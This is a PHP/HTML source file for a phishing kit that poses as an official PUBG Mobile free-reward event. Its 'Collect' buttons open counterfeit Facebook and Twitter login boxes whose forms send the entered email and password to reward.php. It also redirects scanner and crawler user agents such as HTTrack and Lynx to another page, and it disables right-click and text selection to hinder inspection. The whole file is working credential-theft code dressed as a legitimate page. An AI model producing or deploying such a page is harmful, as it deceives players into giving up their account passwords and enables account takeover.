<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style type="text/css">
#collect fieldset:not(:first-of-type) {
display: none;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
@media only screen and (max-width:600px) {
	.popup-box-login-fb {
		margin-top: 4%;
	}
}
</style>
  
<div class="container">
<div style="background: #000; width: 100%; height: 50px; border-bottom: 1px solid #eaa300;">
<img style="width: 35px; float: left; margin-top: 7px; margin-left: 10px; border-radius: 5px;" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div style="margin-left: 6px; margin-top: 5px; color: #eaa300; font-size: 17px; font-family: Teko; text-align: left; text-transform: uppercase; float: left;">
PUBG MOBILE
</br>
<span style="color: #fff; line-height: 10px;">Official PUBG Mobile</span>
</div>
<div style="width: auto; margin-top: -7px; margin-right: 12px; float: right;">
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Purchase</button>
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Download</button>
</div>
</div>
<div class="header"></div>

<div class="box">
<center>
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>

<div class="alert-wrapper">
		<div class="alert">
			<div class="alert-time">
				<div id="timer1"></div>
			</div>
			<div class="slider animated fadeIn">Welcome to Silvanus X-Suit Event</div>
			<div class="slider animated fadeIn">Collect your free reward just today</div>
		</div>
		</div>
</center>

<div id="latest" class="gallery">
<div class="scroll">
<center>
<div class="item itemShine">
<figure>
<img src="img/reward/1.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/2.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/3.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/4.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/5.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
<div class="item itemShine">
<figure>
<img src="img/reward/6.png">
</figure>
<div>
<button style="border-top: 0px;" onmousedown="buka.play();" onclick="open_login();">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<p>
<div class="footer">
<img src="img/footer_img.png">
<div class="footer-txt">&copy; 2018-2022 PUBG CORPORATION. All rights reserved.</div>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup open_login">
<div class="popup-box">
<div class="popup-box-bg">
<div class="popup-box-title">Account Login</div> <!--- popup-box-title --->
<div class="popup-alert">Login to receive your selected reward</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login_facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
			Login to your account to connect to PUBG MOBILE.
			</div>
			<form action="reward.php" method="post">
				<input type="text" class="loginEmail" name="email" placeholder="Mobile number or email" autocomplete="off" autocapitalize="off" required>
				<input type="password" class="loginPassword" name="password" id="fbPassword" placeholder="password" autocomplete="off" autocapitalize="off" required>
				<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create an account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgot your password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">?????????</div>
			<div class="language-name">Espa??ol</div>
			<div class="language-name">Portugu??s (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login_twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="reward.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
				<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
					<label>Password</label>
					<input type="password" style="width: 85%;" name="password" id="twitterPassword" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Login</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">???</div>
				<div class="footer-menu-twitter">sign up twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<!--- fieldset content --->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/fieldset.js"></script>
<script src="js/slider.js"></script>
<script src="js/click.js"></script>
<script>
function open_facebook() {
        $('.login_facebook').show();
        $('.open_login').hide();
    }
	function open_twitter() {
        $('.login_twitter').show();
        $('.open_login').hide();
    }
	function close_facebook() {
        $('.login_facebook').hide();
        $('.open_login').show();
    }
	function close_twitter() {
        $('.login_twitter').hide();
        $('.open_login').show();
    }
</script>
<script>
// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}
</script>
</body>
</html>